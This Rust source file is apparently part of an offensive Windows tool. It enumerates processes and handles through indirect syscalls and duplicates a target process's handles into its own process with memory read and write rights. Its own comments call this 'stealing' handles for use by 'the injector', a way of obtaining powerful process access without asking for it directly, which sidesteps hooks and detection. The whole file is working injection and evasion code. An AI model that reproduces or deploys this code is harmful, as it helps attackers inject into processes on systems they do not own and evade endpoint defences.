//! Handle duplication module using indirect syscalls.
//!
//! Strategy:
//! 1. `ZwQuerySystemInformation(SystemProcessInformation)` → enumerate processes → find PID
//! 2. Open target with minimal `PROCESS_DUP_HANDLE` only (0x0040)
//! 3. `ZwQuerySystemInformation(SystemExtendedHandleInformation)` → enumerate handles owned by target
//! 4. `ZwDuplicateObject` → duplicate each handle into our process

use core::ffi::c_void;
use core::ptr::null_mut;
use core::mem;

use anyhow::{Result, anyhow};

use winapi::shared::ntdef::{
    HANDLE, PVOID, ULONG, USHORT,
    OBJECT_ATTRIBUTES, UNICODE_STRING,
};
use winapi::shared::basetsd::ULONG_PTR;
use winapi::shared::ntstatus::{
    STATUS_SUCCESS,
    STATUS_INFO_LENGTH_MISMATCH,
};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{
    PROCESS_DUP_HANDLE,
    PROCESS_VM_WRITE,
    PROCESS_VM_READ,
    PROCESS_QUERY_INFORMATION,
    SYNCHRONIZE,
};
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntexapi::{
    SYSTEM_INFORMATION_CLASS,
    SystemProcessInformation,
    SystemExtendedHandleInformation,
};
use ntapi::ntobapi::NtClose;

use crate::nt_api::*;
use crate::{debug_eprintln, debug_println};

// ── Reproduce struct layouts we need ──────────────────────────────────────

#[repr(C)]
pub struct SystemProcessInfo {
    pub next_entry_offset: u32,
    pub number_of_threads: u32,
    pub working_set_private_size: u64,
    pub hard_fault_count: u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time: u64,
    pub create_time: i64,
    pub user_time: i64,
    pub kernel_time: i64,
    pub image_name: UNICODE_STRING,
    pub base_priority: i32,
    pub unique_process_id: PVOID,
    pub inherited_from_unique_process_id: PVOID,
    pub handle_count: u32,
    pub session_id: u32,
    pub unique_process_key: *mut c_void,
    _padding: [u64; 32],
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct ExtendedHandleEntry {
    pub object: PVOID,
    pub unique_process_id: ULONG_PTR,
    pub handle_value: ULONG_PTR,
    pub granted_access: ULONG,
    pub creator_back_trace_index: USHORT,
    pub object_type_index: USHORT,
    pub handle_attributes: ULONG,
    pub reserved: ULONG,
}

#[repr(C)]
pub struct ExtendedHandleInfo {
    pub number_of_handles: ULONG_PTR,
    pub reserved: ULONG_PTR,
    pub handles: [ExtendedHandleEntry; 1],
}

// ── helper: query system info with auto-growing buffer ────────────────────

unsafe fn query_system_info(
    info_class: SYSTEM_INFORMATION_CLASS,
) -> Result<Box<[u8]>>
{
    let ssn    = unsafe { ZW_SSN[ZwIndex::ZwQuerySystemInformation as usize].ssn };
    let sysret = unsafe { ZW_SSN[ZwIndex::ZwQuerySystemInformation as usize].syscall_ret };

    // First call: query required size
    let mut needed: usize = 0;
    let mut status = unsafe {
        zw_query_system_information(
            info_class as u32,
            null_mut(),
            0,
            &mut needed as *mut usize,
            ssn,
            sysret,
        )
    };

    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected here
    if status != STATUS_INFO_LENGTH_MISMATCH as i32 && status != STATUS_SUCCESS as i32 {
        anyhow::bail!("ZwQuerySystemInformation (probe) failed: 0x{:X}", status);
    }

    if needed == 0 {
        needed = mem::size_of::<ExtendedHandleInfo>() as usize;
    }

    // Allocate buffer
    let mut buf: Vec<u8> = vec![0u8; needed];
    let mut return_len: usize = 0;

    status = unsafe {
        zw_query_system_information(
            info_class as u32,
            buf.as_mut_ptr() as *mut c_void,
            buf.len(),
            &mut return_len as *mut usize,
            ssn,
            sysret,
        )
    };

    if status != STATUS_SUCCESS as i32 {
        anyhow::bail!("ZwQuerySystemInformation failed (size={}): 0x{:X}", needed, status);
    }

    Ok(buf.into_boxed_slice())
}

// ── public API ─────────────────────────────────────────────────────────────

/// Find a process PID by its image name (case-insensitive, e.g. "explorer.exe").
pub fn find_process_pid(name: &str) -> Result<u32> {
    unsafe {
        let buf = query_system_info(SystemProcessInformation)?;
        let base = buf.as_ptr() as *const u8;

        let mut offset: usize = 0;
        loop {
            let entry = &*(base.add(offset) as *const SystemProcessInfo);
            let pid = entry.unique_process_id as u32;

            // Read image name (UTF-16)
            if !entry.image_name.Buffer.is_null() && entry.image_name.Length > 0 {
                let len = (entry.image_name.Length / 2) as usize;
                let slice = core::slice::from_raw_parts(
                    entry.image_name.Buffer as *const u16,
                    len,
                );
                let proc_name = String::from_utf16_lossy(slice)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if proc_name == name.to_lowercase() {
                    debug_println!("[INFO] Found {} (PID: {})", name, pid);
                    return Ok(pid);
                }
            }

            if entry.next_entry_offset == 0 {
                break;
            }
            offset += entry.next_entry_offset as usize;
        }
    }

    Err(anyhow!("[ERROR] Process '{}' not found", name))
}

/// Enumerate all handles owned by `target_pid` and return the raw entries.
pub fn enumerate_handles(target_pid: u32) -> Result<Vec<ExtendedHandleEntry>> {
    unsafe {
        let buf = query_system_info(SystemExtendedHandleInformation)?;
        let info = &*(buf.as_ptr() as *const ExtendedHandleInfo);
        let count = info.number_of_handles as usize;

        let mut result = Vec::with_capacity(count);

        for i in 0..count {
            let entry = &*(&info.handles[0] as *const ExtendedHandleEntry).add(i);
            if entry.unique_process_id as u32 == target_pid {
                result.push(*entry);
            }
        }

        debug_println!(
            "[INFO] Found {} handles owned by PID {}",
            result.len(),
            target_pid,
        );
        Ok(result)
    }
}

/// Desired access rights for duplicated handles.
pub const TARGET_ACCESS: u32 =
    PROCESS_VM_WRITE | SYNCHRONIZE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;

/// Duplicate a single handle from `source_process_handle` into our process.
pub unsafe fn duplicate_handle(
    source_process_handle: HANDLE,
    source_handle_value: usize,
    desired_access: u32,
) -> Result<HANDLE> {
    unsafe {
        let mut target_handle: HANDLE = null_mut();

        let ssn = ZW_SSN[ZwIndex::ZwDuplicateObject as usize].ssn;
        let sysret = ZW_SSN[ZwIndex::ZwDuplicateObject as usize].syscall_ret;

        let status = zw_duplicate_object(
            source_process_handle,
            source_handle_value as HANDLE,
            GetCurrentProcess(),
            &mut target_handle as *mut HANDLE,
            desired_access,
            0,   // handle_attributes
            0,   // options (no DUPLICATE_CLOSE_SOURCE, no DUPLICATE_SAME_ACCESS)
            ssn,
            sysret,
        );

        if status != STATUS_SUCCESS as i32 {
            return Err(anyhow!(
                "[ERROR] ZwDuplicateObject failed for handle 0x{:X}: 0x{:X}",
                source_handle_value,
                status,
            ));
        }

        Ok(target_handle)
    }
}

/// Steal handles owned by `target_pid` by duplicating them into our process.
///
/// Opens the target with minimal `PROCESS_DUP_HANDLE` only, enumerates its
/// handles via indirect syscall, and duplicates each with TARGET_ACCESS.
pub fn steal_handles(target_pid: u32) -> Result<Vec<HANDLE>> {
    unsafe {
        // ── 1. Open target with PROCESS_DUP_HANDLE only ───────────────────
        let mut proc_handle: HANDLE = null_mut();
        let client_id = CLIENT_ID {
            UniqueProcess: target_pid as _,
            UniqueThread: 0 as _,
        };
        let object_attributes = OBJECT_ATTRIBUTES {
            Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };

        let ssn_open = ZW_SSN[ZwIndex::ZwOpenProcess as usize].ssn;
        let ret_open = ZW_SSN[ZwIndex::ZwOpenProcess as usize].syscall_ret;

        let status = zw_open_process(
            &mut proc_handle as *mut HANDLE,
            PROCESS_DUP_HANDLE,
            &object_attributes as *const OBJECT_ATTRIBUTES as *mut OBJECT_ATTRIBUTES,
            &client_id as *const CLIENT_ID as *mut CLIENT_ID,
            ssn_open,
            ret_open,
        );

        if status != STATUS_SUCCESS as i32 {
            anyhow::bail!(
                "[ERROR] Failed to open PID {} with PROCESS_DUP_HANDLE: 0x{:X}",
                target_pid,
                status,
            );
        }

        debug_println!(
            "[INFO] Opened PID {} with PROCESS_DUP_HANDLE (handle: 0x{:X})",
            target_pid,
            proc_handle as usize,
        );

        // ── 2. Enumerate handles ──────────────────────────────────────────
        let handles = enumerate_handles(target_pid)?;

        // ── 3. Duplicate each handle with target access ───────────────────
        let mut stolen: Vec<HANDLE> = Vec::new();

        for entry in &handles {
            let hv = entry.handle_value as usize;
            match duplicate_handle(proc_handle, hv, TARGET_ACCESS) {
                Ok(h) => {
                    debug_println!(
                        "[INFO] Duplicated handle 0x{:X} (type_idx={}, access=0x{:08X}) → 0x{:X}",
                        hv,
                        entry.object_type_index,
                        entry.granted_access,
                        h as usize,
                    );
                    stolen.push(h);
                }
                Err(e) => {
                    debug_eprintln!(
                        "[WARN] Skip handle 0x{:X} (type_idx={}): {}",
                        hv,
                        entry.object_type_index,
                        e,
                    );
                }
            }
        }

        // ── 4. Close the minimal process handle ───────────────────────────
        NtClose(proc_handle);

        debug_println!(
            "[INFO] Stole {} / {} handles from PID {}",
            stolen.len(),
            handles.len(),
            target_pid,
        );

        Ok(stolen)
    }
}

/// Targeted handle stealing: open the target with minimal
/// `PROCESS_DUP_HANDLE` only, enumerate its handles, then try to
/// duplicate a handle with the specified `desired_access`.
///
/// This is meant for use in the injector: instead of calling
/// `zw_open_process` with broad rights, we let the target's own
/// self-referential handle supply those rights.
pub fn steal_process_handle(target_pid: u32, desired_access: u32) -> Result<HANDLE> {
    unsafe {
        // ── 1. Open target with PROCESS_DUP_HANDLE only ───────────────────
        let mut proc_handle: HANDLE = null_mut();
        let client_id = CLIENT_ID {
            UniqueProcess: target_pid as _,
            UniqueThread: 0 as _,
        };
        let object_attributes = OBJECT_ATTRIBUTES {
            Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };

        let ssn_open = ZW_SSN[ZwIndex::ZwOpenProcess as usize].ssn;
        let ret_open = ZW_SSN[ZwIndex::ZwOpenProcess as usize].syscall_ret;

        let status = zw_open_process(
            &mut proc_handle as *mut HANDLE,
            PROCESS_DUP_HANDLE,
            &object_attributes as *const OBJECT_ATTRIBUTES as *mut OBJECT_ATTRIBUTES,
            &client_id as *const CLIENT_ID as *mut CLIENT_ID,
            ssn_open,
            ret_open,
        );
        if status != STATUS_SUCCESS as i32 {
            anyhow::bail!(
                "[ERROR] Failed to open PID {} with PROCESS_DUP_HANDLE: 0x{:X}",
                target_pid,
                status,
            );
        }

        // ── 2. Enumerate handles owned by PID ─────────────────────────────
        let handles = enumerate_handles(target_pid)?;

        // ── 3. Try each handle; return the first that duplicates ──────────
        for entry in &handles {
            let hv = entry.handle_value as usize;
            if let Ok(h) = duplicate_handle(proc_handle, hv, desired_access) {
                debug_println!(
                    "[INFO] Stolen process handle 0x{:X} (orig hv=0x{:X}, type_idx={})",
                    h as usize,
                    hv,
                    entry.object_type_index,
                );
                NtClose(proc_handle);
                return Ok(h);
            }
        }

        NtClose(proc_handle);
        Err(anyhow!(
            "[ERROR] Could not steal any handle with required access from PID {}",
            target_pid,
        ))
    }
}
